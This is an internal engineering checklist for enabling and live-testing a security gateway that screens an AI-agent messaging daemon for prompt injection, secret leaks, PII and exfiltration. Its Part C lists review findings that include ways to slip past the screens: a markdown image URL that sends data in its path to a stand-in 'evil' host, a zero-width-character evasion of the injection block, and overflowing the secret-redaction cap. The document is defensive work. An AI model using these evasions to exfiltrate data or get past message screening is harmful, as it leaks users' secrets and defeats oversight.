---
name: m9-switch-on-checklist
type: work-order
date: 2026-07-13
topics: [m9, security-gateway, screening, injection-defense, switch-on, live-test, launch]
status: open
description: >
  DOD-M9-SWITCH-ON-1 — what stands between the merged-but-off M9 security gateway and a real live
  test. The wiring is ONE hole (cello-daemon.ts never passes securityGateway), but the Fable-5
  security review found 7 substantive defects behind it that a switch-on would carry straight into
  production. This is the ordered checklist. NOT started; sequenced AFTER the pending publish cascade.
---

# `DOD-M9-SWITCH-ON-1` — from merged-but-off to live-tested

> ## ⚠️ VERIFY EACH CLAIM AGAINST THE CODE BEFORE ACTING ON IT.
>
> **This document, and the M9 DoD, have each been confidently WRONG about the code — in opposite
> directions — and both were caught only by reading the source (2026-07-13):**
>
> - **This checklist said D1 (the governance re-send) was "NOT BUILT" and "security-critical".** It is
>   **fully built**, end to end, and the hard parts are right. **It was the single largest item on this
>   list.** Struck below.
> - **The M9 DoD says the IN-003 language allowlist is "NOT yet wired live."** The code **blocks**, by
>   default, with no configuration at all. The DoD is wrong. See C7.
>
> The wiring items (A1, A3) were verified TRUE. The lesson is not "the doc is bad" — it is that a plan
> document drifts from the code in BOTH directions, and an overnight run that trusts it will build
> something that exists and skip something that doesn't. **Read the source first. Every time.**

**Sequencing (Andre, 2026-07-13): the pending publish cascade goes FIRST.** A lot of code changed
today (the dead-code purge, the daemon decomposition, DOD-AGENT-PARAM-1, DOD-SESSION-NAME-1). Ship
and live-test *that* before adding a whole security layer on top of it. Debugging a screening
regression on top of an unproven daemon is two problems wearing one coat. **Do not start this work
until the cascade is published and exercised.**

## Where we actually are

The M9 gateway is **merged, published, and shipping** — it is not missing, and this is not a build
job. `@cello-protocol/gateway@0.0.2` is a real published package (not private), it is already a
dependency of `core/daemon`, it has its own `cello-gateway` binary, and it is fully env-configured.
Both screen compositions are wired (inbound: sanitizer + injection patterns + language + scanner-
when-loaded; outbound: rate-limit + secrets + PII + exfil). `spawnGatewaySidecar()` +
`LocalSidecarGatewayClient` are the exact API the green `m9-gate-1` test already drives.

**The wiring gap is one line, at one place:**

```
core/daemon/src/bin/cello-daemon.ts:74
  const handle = await startDaemon({ celloDir, socketPath, ... });   // no securityGateway
```

…so `daemon.ts:232`'s default wins: `config.securityGateway ?? new PassthroughGatewayClient()`.
This is a **conscious decision, already known** — it is not news and does not need re-discovering.
M9-GATE-1's own done-condition was a harness that spawns the gateway itself, so the gate went green
honestly; the operator-facing composition root was simply never in scope.

**The Fable-5 security review is the reason this is more than a one-line change.** It read every
non-test source file under `core/gateway/src/` plus the full daemon-seam diff, and its verdict on
the design is worth quoting, because it changes how you should read the defect list below:

> *"The design is genuinely good. The fail-closed plumbing (client/server/timeouts), the
> loosen-confirm config gate, the hash-chained records, the terminal-vs-transient inbound split, and
> the RE2 discipline in the detectors are all correct and carefully reasoned. The detectors have
> honest, documented coverage limits. This is not sloppy work."*

and, on the highest-value attacks:

> *"**Nothing found** that lets an attacker forge a verdict over the wire, that lets the daemon
> override the PII/override gate, or that makes the fail-closed client silently allow — those were
> the highest-value targets and they hold."*

So the load-bearing security architecture holds. What follows is a switch-on checklist plus seven
real defects in the *detectors* and *defaults* — the kind that get carried into production the day
you flip the switch, and are far cheaper to fix before that than after.

---

## Part A — wire it on

- [ ] **A1. Spawn the sidecar and pass the client.** In `core/daemon/src/bin/cello-daemon.ts`, call
      `spawnGatewaySidecar()`, build a `LocalSidecarGatewayClient`, pass it as `securityGateway` to
      `startDaemon()`. `core/daemon/src/__tests__/m9-gate-1.test.ts:89-93` is the reference
      implementation — it already does exactly this, against real processes.
- [ ] **A2. Child lifecycle — kill the gateway on daemon shutdown.** Hook the existing
      `handle.stop` / SIGTERM path. **An orphaned gateway holding a socket is the same failure class
      as the orphan daemons `DOD-DAEMON-CLEANUP-1` / `DOD-SINGLE-DAEMON-1` just fixed.** Do not
      recreate that bug in a new process. Unlink the gateway socket only if we own it.
- [ ] **A3. The kill switch.** An explicit env flag (e.g. `CELLO_SECURITY=off`) that falls back to
      `PassthroughGatewayClient`. **Build this BEFORE flipping the switch, not after.** The launch
      bar names a kill switch as a first-class requirement; the first time screening misfires on a
      real conversation you will want it to already exist.
- [ ] **A4. Paths under `~/.cello/`.** `CELLO_GATEWAY_SOCKET` (required), `CELLO_GATEWAY_CONFIG_DB`,
      `CELLO_GATEWAY_REQUEST_LOG`. Give them real defaults; do not make the operator set env vars.
- [ ] **A5. Seed the PII whitelist from the registered identity.** `M9-OUT-002`'s entire premise is
      *"a whitelisted own-email passes silently."* Today the whitelist is a comma-separated env var
      (`CELLO_GATEWAY_PII_WHITELIST`). **Unseeded, the operator's own email address gets flagged on
      their first message** — the worst possible first impression of the feature.

## Part B — decide the failure policy BEFORE flipping (not after)

> **Still OPEN and blocking the overnight work — Andre's call:**
> - **B1** (below): if the sidecar fails to spawn, does the daemon refuse to start, or start unscreened?
> - **D1** (Part D): `warn` is a dead end — build the governance re-send, or accept warn == blocked for
>   the trial and script around it?
>
> **DECIDED 2026-07-13:** C7 (allowlist is opt-in; empty ⇒ inactive, and loudly so) and B2 (benchmark
> the deadline, including against message size — do not guess).

- [ ] **B1. Startup-failure policy — THE ONLY DECISION STILL OPEN.** If the sidecar fails to spawn,
      does the daemon refuse to start, or start unscreened? Fail-closed is the designed behavior for
      an *unreachable* gateway at runtime; the *startup* case is separate and currently unmade. (No
      code exists either way — verified.) The review is explicit that **production should not be
      *able* to run passthrough** — the A3 flag should be the ONLY route to it.

      **Recommendation: REFUSE TO START**, with an error naming the cause and the escape hatch.
      Starting unscreened is a *silent security downgrade on a bad day*: the operator gets no signal,
      while `SKILL.md` tells them their messages are screened (E1). That is the absent⇒fine pattern in
      its purest form. A loud refusal costs a minute; a quiet passthrough costs the operator the thing
      they installed CELLO for — and you cannot un-leak a message. It is also the reversible choice:
      you can always loosen it later.

      **Condition: A3 (the kill switch) must exist BEFORE the switch is flipped.** Refuse-to-start
      without an escape hatch is a trap.
- [ ] **B2. The deadline — DECIDED: BENCHMARK IT, DO NOT GUESS (Andre, 2026-07-13).** `m9-gate-1`
      runs with `deadlineMs: 2000`. That number is the whole never-hang guarantee (INV-6: *a timeout
      is a verdict, not a hang*), and **2s may well be too short** — it was a test value, never a
      measured one. Before imposing any number:
      - **Measure the real screen latency** for both compositions (inbound: sanitizer + injection
        patterns + language + scanner; outbound: rate-limit + secrets + PII + exfil), on real content.
      - **Measure it as a FUNCTION OF MESSAGE SIZE.** The detectors are regex sweeps over the content,
        so expect roughly linear in length — but "expect" is not a measurement. If latency grows with
        size, a single fixed deadline is wrong: a large legitimate message would time out into a
        fail-closed BLOCK, which reads to the operator as a security refusal rather than a timeout.
      - THEN pick the deadline, with headroom, and confirm it sits below the MCP host timeout.
      A deadline set by guess is a self-inflicted denial of service on your own users.

      **Deliverable: a benchmark, not an opinion.** Screen latency (p50/p95/max) for both compositions
      at, say, 1 KB / 10 KB / 100 KB / 1 MB (the content cap). Publish the table in this document. The
      deadline is then a number with headroom over the measured p95 at the cap — not a round figure
      someone liked.

## Part C — the Fable-5 review's findings (`M9-SECURITY-REVIEW-FABLE5.md`)

Findings #1 (inert layer) and #2 (plaintext stores) are tracked elsewhere — #1 is Part A of this
document, #2 is `DOD-CRYPTO-AT-REST-1` in [[M8C-DEFINITION-OF-DONE]]. **The remaining seven are new
work that belongs to this switch-on**, because flipping the switch is what makes them exploitable.

- [ ] **C1. MEDIUM — outbound injection-artifact BLOCK is evadable with a zero-width character.**
      The block check runs BEFORE the invisible-strip on the outbound path. **Inbound has the right
      order; outbound inverts it.** So an artifact laced with a zero-width char sails through the
      block and is then stripped clean on the way out. This is an ordering bug, and the fix is to
      make outbound match inbound.
- [ ] **C2. MEDIUM — inbound `redact`-without-content fails OPEN.** When a redact verdict arrives
      with no replacement content, the inbound seam **delivers the ORIGINAL** — while the outbound
      seam fails CLOSED on the identical case. A fail-open default pointing the wrong way, in the
      layer whose job is to be the floor. Latent today; a live detector bug makes it real.
- [ ] **C3. MEDIUM — path-based image exfil is not caught.** The image-exfil check only inspects
      `?`-query URLs, so `![](http://evil/<data>)` evades both it and the entropy charset check.
- [ ] **C4. MEDIUM — outbound exfil patterns use native `RegExp`, not RE2.** They match against
      **adversary-controlled content** outside the project's own ReDoS discipline. Latent
      DoS → forced-timeout, and no guard stops someone adding an unsafe pattern later. Everything
      else in the detectors is RE2; this is the one hole in that discipline.
- [ ] **C5. LOW — secret redaction caps at 1000 matches per rule, and outbound has no size cap.**
      A crafted high-volume message overflows the cap and **the overflow secrets leak**.
- [ ] **C6. LOW — neither store calls `verifyChain` at gateway boot.** A tampered local config DB is
      trusted until Phase-2 attestation exists. **This and `DOD-CRYPTO-AT-REST-1` are two halves of
      one hole — fixing only one leaves it open** (plaintext on disk is what makes the tamper
      trivial; no boot-time verify is what makes it undetected).
- [ ] **C7. DECIDED (Andre, 2026-07-13) — the language allowlist is OPT-IN: EMPTY ⇒ INACTIVE.**
      The IN-003 allowlist is currently LIVE and blocking — it terminally drops **all confident
      non-Latin inbound**, while the M9 DoD claims it is "NOT yet wired live." The DoD is wrong; the
      code blocks.

      **The rule:** an **empty allowlist means the filter is OFF and everything is allowed.** It
      becomes active only when an operator explicitly sets one. Correct for this heuristic: it is
      trivially evaded, so its realistic failure is a **false positive** — silently dropping a
      legitimate counterparty's message — not a false negative. Nobody should have a language filter
      they never asked for.

      **⚠️ BUT: an inactive security layer must NEVER be SILENTLY inactive.** "Absent config ⇒ allow
      everything" is structurally the same shape as the absent⇒fine defect class this milestone spent
      a week killing. The difference is that here it is *intended* — which obliges us to make it
      LOUD, not to hide it:
      - the gateway **logs at boot** that the language filter is INACTIVE (and, when set, what the
        allowlist is);
      - `cello status` (or the gateway's own status surface) can show it;
      - the default must be visible in the docs, not discovered.

      **The code, precisely** (verified 2026-07-13 — it blocks by DEFAULT, with zero configuration):
      - `core/gateway/src/screen/inbound.ts:93` composes it **unconditionally**:
        `screenInboundLanguage(deliveredText, this.#language ?? {})`
      - `core/gateway/src/detect/language.ts:67` then defaults to Latin-only: `opts.allow ?? ["latin"]`
      - → a confident non-Latin inbound message is a **TERMINAL block** (`inbound_language_blocked`),
        dropped and never delivered, for an operator who configured nothing.

      Implement as: **unset/empty allowlist → the detector is NOT COMPOSED into the inbound screen at
      all.** Not "composed but always passes" — *not composed*, so it cannot misfire and costs no
      latency. Then log at boot that the filter is INACTIVE.

## Part D — the gap that will bite in the first live test

- [x] **~~D1. The stateless governance re-send is NOT BUILT.~~ ❌ FALSE — IT IS BUILT. Verified in
      the source, 2026-07-13. Nothing to do here; `warn` is NOT a dead end.**

      All four links traced:
      - **MCP shim** — `core/adapter-claude-code/src/bin/cello-mcp.ts:275` exposes `governance_decisions`
        with a full zod schema.
      - **Daemon** — `core/daemon/src/session-content-handlers.ts:135` parses + shape-validates it,
        threads `governanceDecisions` into `screenOutbound`, and returns `governance_warn` with `flags`.
      - **Gateway transport** — `client.ts` → `protocol.ts` → `server.ts` all carry it.
      - **Gateway screen** — `core/gateway/src/screen/outbound.ts:130` **APPLIES it** (`#resolvePII`).

      And it is not a stub — the hard parts are right: `allow_once`/`allow_always` are honored **only**
      when `autonomous_override` is on, else **rejected → re-warn**; if ANY flag is rejected the whole
      send re-warns (**nothing goes out half-decided**); `allow_always` under autonomous mode degrades
      to allow-once **plus a whitelist-add REQUEST**, because persisting is a human action; and a rate
      slot is committed **once**, not twice across the warn → re-send round trip. `M9-FEED-001` is
      ✅ EARNED in the M9 DoD, explicitly including this flow, with a warn round-trip proven by test.

- [ ] **D1′. The ONE thing to actually verify (and it is cheap).** The wiring exists but has never run
      through a real operator install. Confirm the **`flagId` round trip**: the ids the daemon hands
      back in `flags` must be the SAME ids the gateway expects in `governance_decisions`. That is the
      classic seam where a flow like this breaks, and an in-process test that drives both halves can
      miss it. Test it across the real daemon↔sidecar boundary, not in one process.
- [ ] **D2. IN-002 / DeBERTa stays OFF.** Deferred by decision (Andre, 2026-06-23) pending the 568 MB
      model + runtime infra. Absent model → Layer-2 off, graceful. Fine for a live test — just know
      that **semantic** injection detection is not in it; only Layer-1 deterministic patterns are.

## Part E — truth in the shipped docs

- [ ] **E1.** `core/adapter-claude-code/SKILL.md` and `README.md` currently tell operators that
      message content is screened. That is **false today** and becomes **true the moment A1 lands**.
      Flip the wording **in the same change** — never before. (See also the standing rule in
      `.claude/CLAUDE.md`: no tool description may claim screening is active while the daemon runs
      passthrough.) `cello_contact_set_tier`'s description carries the same disclaimer and needs the
      same edit.

## Part F — the live test (two real daemons, two agents, real relay)

The M9 gate proved this loop against real processes on one machine. This is the same loop, driven by
hand through the actual operator install, which is the part that has never run.

- [ ] **F1.** Clean message → delivered unchanged.
- [ ] **F2.** AWS key in an outbound message → **redacted**, and the agent is TOLD what was removed.
- [ ] **F3.** Invisible / confusable characters inbound → **sanitized**, notes reach the agent.
- [ ] **F4.** A bulk contact dump outbound → **one** warn, not sent (not N warns).
- [ ] **F5.** Over-rate sends → throttled, with a distinct reason + guidance.
- [ ] **F6. Kill the gateway mid-session → fail-closed BLOCK with a verdict, never a hang.**
      **This is the most important one.** It is INV-6 (*"the feedback channel never lies and never
      hangs"*) and the fail-closed floor, tested the only way that counts: by killing the process.
- [ ] **F7.** The records DB holds a row per screened message (clean passes too) and the hash chain
      verifies.
- [ ] **F8.** The kill switch (A3) actually turns it off, and the daemon still works.

## What this does NOT include

- **Phase 2** (`M9-REMOTE-001`, `M9-ATTEST-001`, `M9-GATE-2`) — the remote mTLS gateway and directory
  attestation. Explicitly "add later, when a customer needs it." Not launch scope.
- **`DOD-CRYPTO-AT-REST-1`** — the plaintext stores. Tracked in [[M8C-DEFINITION-OF-DONE]]. **Does
  not block the live test; DOES block shipping.** Note C6 above: it is half of a hole.

## Publish

Wiring the daemon means a **daemon + cli + connect cascade** (and `gateway` if C1–C6 touch it). Load
`/cello-publish` for THAT publish. Not part of this work order's "done".

## Related

- [[M9-SECURITY-REVIEW-FABLE5]] — the source of Part C. Read it before touching a detector.
- [[M9-DEFINITION-OF-DONE]] — Phase-1 11/12 gate-green, 1 deferred; the ✅s carry named breadth
  caveats (IN-001: only confusables-redact live; OUT-001: only the AWS-key rule live) that are worth
  re-reading before trusting the table.
- [[M8C-DEFINITION-OF-DONE]] — `DOD-CRYPTO-AT-REST-1`.
